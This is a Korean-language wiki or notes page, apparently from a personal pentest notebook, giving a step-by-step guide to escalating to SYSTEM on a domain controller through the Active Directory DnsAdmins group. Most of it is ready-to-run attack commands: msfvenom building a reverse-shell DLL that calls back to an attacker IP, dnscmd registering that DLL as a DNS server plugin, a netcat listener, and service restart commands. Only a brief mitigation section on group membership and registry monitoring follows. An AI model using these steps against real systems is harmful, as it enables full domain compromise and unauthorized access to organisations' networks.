---
layout: page
title: DnsAdmins_(Group)
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


# DnsAdmins 그룹을 이용한 권한 상승 가이드

Active Directory 환경에서 `DnsAdmins` 그룹의 구성원은 DNS 서버에 대한 관리 권한을 가집니다. 이 권한은 DNS 서비스가 시작될 때 임의의 DLL 파일을 로드하도록 설정하는 데 악용될 수 있으며, DNS 서비스는 `NT AUTHORITY\SYSTEM` 권한으로 실행되므로 이는 곧바로 시스템 전체의 권한 상승으로 이어집니다.

> **핵심:** `DnsAdmins` 그룹의 멤버십은 사실상 도메인 관리자(Domain Admin)와 동일한 수준의 권한으로 간주해야 합니다.

---

### **1. 취약점 식별**

- **목표:** 현재 사용자가 `DnsAdmins` 그룹의 멤버인지 확인합니다.

```powershell
whoami /groups
```

- **확인 사항:** 출력된 목록에서 `DnsAdmins` 그룹이 포함되어 있는지 확인합니다.

---

### **2. 공격 원리: 악성 DLL 로딩**

`DnsAdmins` 그룹 멤버는 `dnscmd.exe` 유틸리티를 사용하여 DNS 서버의 설정을 변경할 수 있습니다. 이 중 `/config /serverlevelplugindll` 옵션은 DNS 서비스가 로드할 커스텀 DLL의 경로를 지정하는 기능입니다. 공격자는 이 기능을 악용하여 리버스 셸 코드가 포함된 악성 DLL을 등록하고, 서비스 재시작을 통해 `SYSTEM` 권한으로 코드를 실행합니다.

---

### **3. 단계별 공격 절차**

#### **1단계: 악성 DLL 생성**
- `msfvenom`을 사용하여 리버스 셸을 실행하는 악성 DLL 파일을 생성합니다.

```bash
# -p: 페이로드 지정
# -f: 출력 포맷 (dll)
# LHOST, LPORT: 리스너 IP 및 포트
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o revshell.dll
```

#### **2단계: DLL 업로드**
- 생성된 `revshell.dll` 파일을 DNS 서버(보통 도메인 컨트롤러)의 파일 시스템에 업로드합니다. `C:\Temp`와 같이 누구나 접근 가능한 경로를 사용하는 것이 일반적입니다.

#### **3. DNS 서비스 설정 변경**
- `dnscmd.exe`를 사용하여 DNS 서비스가 우리가 업로드한 악성 DLL을 로드하도록 설정합니다.

```powershell
# <DC_Name>: DNS 서버의 호스트명 (예: DC01.corp.local) 없어도 될 듯
# /config /serverlevelplugindll: 로드할 DLL 경로 지정
dnscmd.exe <DC_Name> /config /serverlevelplugindll "C:\Temp\revshell.dll"
```

#### **4. 리스너 실행 및 서비스 재시작**
- 공격자 머신에서 Netcat 리스너를 실행하고, 타겟 서버의 DNS 서비스를 재시작하여 DLL이 로드되도록 합니다.

```bash
rlwrap nc -lvnp 443
```

```powershell
sc stop dns
sc start dns
```

#### **5. 권한 상승 성공**
- DNS 서비스가 재시작되면서 `revshell.dll`을 로드하고, 공격자의 리스너에 `NT AUTHORITY\SYSTEM` 권한의 셸이 연결됩니다.

---

### **4. 방어 (Mitigation)**

- **멤버십 최소화:** `DnsAdmins` 그룹에는 반드시 필요한 최소한의 관리자 계정만 포함시켜야 합니다.
- **모니터링:** DNS 서버 설정 변경, 특히 `ServerLevelPluginDll` 레지스트리 키(`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\`)에 대한 변경 사항을 모니터링합니다.

